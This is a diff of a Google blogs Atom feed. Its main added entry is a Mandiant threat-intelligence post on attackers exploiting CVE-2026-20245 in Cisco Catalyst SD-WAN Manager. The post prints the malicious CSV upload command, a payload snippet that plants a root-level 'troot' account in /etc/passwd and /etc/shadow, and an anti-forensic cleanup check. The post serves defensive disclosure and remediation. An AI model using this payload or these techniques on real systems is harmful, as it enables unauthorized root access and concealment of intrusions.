@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <id>https://blog.google/</id>
   <title>Google Blogs</title>
-  <updated>2026-06-24T10:53:09.984378+00:00</updated>
+  <updated>2026-06-24T14:35:36.581685+00:00</updated>
   <author>
     <name>Google</name>
   </author>
@@ -10,6 +10,476 @@
   <link href="https://blog.google/" rel="alternate"/>
   <generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator>
   <subtitle>Combined feed of Google's official blogs (The Keyword, Developers, Android, Chrome, Research, DeepMind, Cloud, and more)</subtitle>
+  <entry>
+    <id>https://blog.google/products-and-platforms/platforms/google-pay/google-wallet-tsa/</id>
+    <title>Google Wallet makes TSA PreCheck Touchless ID available for more travelers</title>
+    <updated>2026-06-24T13:00:00+00:00</updated>
+    <content type="html">Illustration of a woman walking through an airport with a suitcase</content>
+    <link href="https://blog.google/products-and-platforms/platforms/google-pay/google-wallet-tsa/"/>
+    <category term="The Keyword"/>
+    <published>2026-06-24T13:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/</id>
+    <title>Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</title>
+    <updated>2026-06-24T11:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan&lt;/p&gt;
+&lt;hr /&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Introduction&lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt; &lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability (&lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Key Observations&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;strong style="vertical-align: baseline;"&gt;Rogue Peering and Credential Manipulation&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Extensive Anti-Forensic Cleanup&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged&lt;/span&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;What is SD-WAN?&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;What is Peering?&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20127&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20182&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Intrusion Campaign Overview&lt;/span&gt;&lt;/h3&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Initial Access Via Rogue Peering Connections&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Successful Authentications By Altering The Admin Account Password&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account on the same victim devices.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Once authenticated via SSH, the threat actor executed commands to change the password of the default &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account and exfiltrated configurations of the SD-WAN fabric.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/&amp;lt;Device ID&amp;gt; HTTP/1.1" 200 - 0 3732 18 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/&amp;lt;Device ID&amp;gt; HTTP/1.1" 400 - 0 134 19 - "&amp;lt;Threat Actor Control Plane IP&amp;gt;" "Mozilla/5.0" "&amp;lt;Log ID&amp;gt;" "&amp;lt;SD-WAN Manager IP&amp;gt;:8443" "127.0.0.1:8080"
+&amp;lt;...&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 1: Threat actor authentication and configuration extraction&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;The threat actor subsequently used their active &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; session to change the password of the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations&lt;/span&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vmanage-admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but &lt;/span&gt;&lt;a href="https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;neither possesses root shell access&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Exploitation of CVE-2026-20245 to Escalate Privileges&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;After establishing an SSH session with the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 2: Malicious file upload&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] &amp;amp;&amp;amp; grep -q '&amp;lt;redacted&amp;gt;' /usr/share/viptela/vbond_vsmart_tenant_list 2&amp;gt;/dev/null; then
+    echo absent &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
+    echo present &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+    cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
+else
+    echo absent &amp;gt; /home/admin/.orig_vbond_vsmart_tenant_list.state;
+fi;
+cp -a /etc/passwd /home/admin/.orig_passwd;
+cp -a /etc/shadow /home/admin/.orig_shadow;
+grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' &amp;gt;&amp;gt; /etc/passwd;
+grep -q '^troot:' /etc/shadow || echo 'troot:&amp;lt;redacted&amp;gt;:19000:0:99999:7:::' &amp;gt;&amp;gt; /etc/shadow&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 3: Appending malicious entries&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Through this command, the threat actor achieved the following:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Backed up the original &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vbond_vsmart_tenant_list&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; configuration file, which would have been overwritten by the contents of &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Created backups of the original &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/etc/shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Created a user account named &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; with full root privileges.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant subsequently observed the threat actor accessing this new &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account from the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;admin&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account via the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;su&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (substitute user) command.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Anti-Forensic Techniques&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;span style="vertical-align: baseline;"&gt;Mandiant identified that the threat actor deleted all files they created, including &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;evil_tenant.csv&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint&lt;/span&gt;. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-plain"&gt;&lt;code&gt;for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow; 
+    do if [ -e "$f" ]; 
+        then echo PRESENT:$f; ls -ld "$f"; 
+        else echo ABSENT:$f; 
+    fi; 
+done; 
+
+if grep -q '^troot:' /etc/passwd; 
+    then echo PRESENT:/etc/passwd:troot; 
+    else echo ABSENT:/etc/passwd:troot; 
+fi; 
+
+if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; 
+    then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list; 
+    else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list; 
+fi&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 4: Validation script&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This script checks for the presence of the following:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Threat actor-created files in &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/home/admin.&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;troot&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; account in the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;passwd&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;shadow&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;vbond_vsmart_tenant_list&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and if it exists, inspect information about the file. This is likely to check if the original file was restored.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Outlook and Implications&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;closely&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;tracked&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;and&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;reported&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; on increased zero-day exploitation of edge devices over the past several years.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Remediation and Hardening&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Perform IOC Sweep / Threat Hunting:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Collect logs and diagnostic data from SD-WAN devices by executing &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;request admin-tech&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Manual Remediation Support:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to &lt;/span&gt;&lt;a href="https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Cisco Technical Assistance Center (TAC)&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for comprehensive review and remediation assistance.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Prioritize Immediate Patching and Upgrades:&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;CVE-2026-20245&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;: Organizations should follow the comprehensive security best practices and configuration standards detailed in the &lt;/span&gt;&lt;a href="https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Cisco Catalyst SD-WAN Hardening Guide&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Indicators of Compromise (IOCs)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free &lt;/span&gt;&lt;a href="https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;GTI Collection&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for registered users.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Network Indicators&lt;/span&gt;&lt;/h4&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
